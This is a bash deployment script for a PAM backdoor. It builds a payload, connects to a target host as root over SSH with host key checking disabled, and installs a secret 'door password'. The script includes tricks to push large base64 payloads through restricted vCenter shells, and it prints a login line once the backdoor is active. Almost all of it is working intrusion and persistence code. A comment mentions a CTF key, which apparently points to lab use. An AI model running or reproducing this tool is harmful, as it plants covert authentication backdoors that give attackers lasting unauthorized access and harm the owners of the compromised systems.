#!/bin/bash
#
# Deploy PAM backdoor to a remote machine
#
# Usage:
#   ./deploy.sh -h HOST -p DOOR_PASS [-s SSH_PASS] [-P PORT] [-i KEYFILE] [-u USER]
#
# Options:
#   -h HOST       Target host
#   -p DOOR_PASS  Backdoor password to install
#   -s SSH_PASS   Existing SSH login password (omit if using -i)
#   -P PORT       SSH port (default: 22)
#   -i KEYFILE    SSH private key for initial access
#   -u USER       SSH user (default: root)
#   -T ARCH       Build target: x86_64 (default) or photon1 (vCenter/PhotonOS 1.0)
#
# Examples:
#   ./deploy.sh -h 10.0.0.1 -p backdoorpass -s existingpass
#   ./deploy.sh -h 10.0.0.1 -p backdoorpass -i ~/.ssh/id_rsa
#   ./deploy.sh -h 10.0.0.1 -p backdoorpass -s existingpass -P 2222
#   ./deploy.sh -h vcenter -p backdoorpass -i ~/.ssh/ctfkey -T photon1
#

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

HOST=""
DOOR_PASS=""
SSH_PASS=""
SSH_PORT=22
SSH_USER="root"
SSH_KEY=""
BUILD_ARCH="x86_64"

usage() {
    grep '^#' "$0" | grep -v '#!/' | sed 's/^# \{0,1\}//'
    exit 1
}

while getopts "h:p:s:P:i:u:T:" opt; do
    case "$opt" in
        h) HOST="$OPTARG" ;;
        p) DOOR_PASS="$OPTARG" ;;
        s) SSH_PASS="$OPTARG" ;;
        P) SSH_PORT="$OPTARG" ;;
        i) SSH_KEY="$OPTARG" ;;
        u) SSH_USER="$OPTARG" ;;
        T) BUILD_ARCH="$OPTARG" ;;
        *) usage ;;
    esac
done

[ -z "$HOST" ]      && echo "error: -h HOST required" && exit 1
[ -z "$DOOR_PASS" ] && echo "error: -p DOOR_PASS required" && exit 1
[ -z "$SSH_PASS" ] && [ -z "$SSH_KEY" ] && echo "error: -s SSH_PASS or -i KEYFILE required" && exit 1

for cmd in gcc ssh; do
    command -v "$cmd" >/dev/null 2>&1 || { echo "error: $cmd not found"; exit 1; }
done
if [ -n "$SSH_PASS" ]; then
    command -v sshpass >/dev/null 2>&1 || { echo "error: sshpass not found (needed for -s)"; exit 1; }
fi

SSH_OPTS="-o StrictHostKeyChecking=no -o BatchMode=no -o ControlMaster=no -o ControlPath=none -p $SSH_PORT"
[ -n "$SSH_KEY" ] && SSH_OPTS="$SSH_OPTS -i $SSH_KEY"
TARGET="${SSH_USER}@${HOST}"

# Pipe payload file directly to bash stdin — avoids base64 line-length limits.
# -tt forces PTY (needed for restricted shells like vCenter appliancesh).
# tr -d '\r' strips CR chars from PTY output.
# grep filters out echoed script lines, keeping only actual output.
do_deploy() {
    ssh -tt $SSH_OPTS "$TARGET" bash 2>&1 < "$1" | tr -d '\r'
}
if [ -n "$SSH_PASS" ]; then
    do_deploy() {
        SSHPASS="$SSH_PASS" sshpass -e ssh -tt $SSH_OPTS "$TARGET" bash 2>&1 < "$1" | tr -d '\r'
    }
fi

echo "[*] Building payload for door password: ${DOOR_PASS}"
PAYLOAD=$(mktemp /tmp/.payload_XXXXXX)
trap "rm -f $PAYLOAD" EXIT

"$SCRIPT_DIR/build.sh" "$DOOR_PASS" "$BUILD_ARCH" > "$PAYLOAD"
echo "[+] Payload built: $(wc -c < "$PAYLOAD") bytes"

# Split long variable assignments into 500-char chunks to avoid
# bash readline line-length truncation when running over PTY
split_payload() {
    # Convert VAR="BIGSTRING" to heredoc form — bash reads heredocs
    # without readline, bypassing PTY line-length and buffer limits.
    # base64 -d handles line-wrapped input fine.
    awk 'BEGIN { sq = sprintf("%c", 39) }
    length($0) > 500 {
        eq = index($0, "=\"")
        if (eq > 0) {
            var = substr($0, 1, eq-1)
            val = substr($0, eq+2)
            if (substr(val, length(val), 1) == "\"")
                val = substr(val, 1, length(val)-1)
            print var "=$(cat << " sq "_HDOC_" sq
            while (length(val) > 0) {
                print substr(val, 1, 76)
                val = substr(val, 77)
            }
            print "_HDOC_"
            print ")"
            next
        }
    }
    { print }' "$1"
}

echo "[*] Deploying to ${TARGET} port ${SSH_PORT} ..."
PROCESSED=$(mktemp /tmp/.payload_p_XXXXXX)
trap "rm -f $PAYLOAD $PROCESSED" EXIT
split_payload "$PAYLOAD" > "$PROCESSED"
echo "exit 0" >> "$PROCESSED"
RESULT=$(do_deploy "$PROCESSED")
echo "[+] Remote: $RESULT"

if echo "$RESULT" | grep -q "deployed"; then
    echo "[+] Done. Backdoor active on ${HOST}:${SSH_PORT}"
    echo "    ssh ${SSH_USER}@${HOST} -p ${SSH_PORT}   # password: ${DOOR_PASS}"
else
    echo "[-] Unexpected output — verify manually"
    exit 1
fi
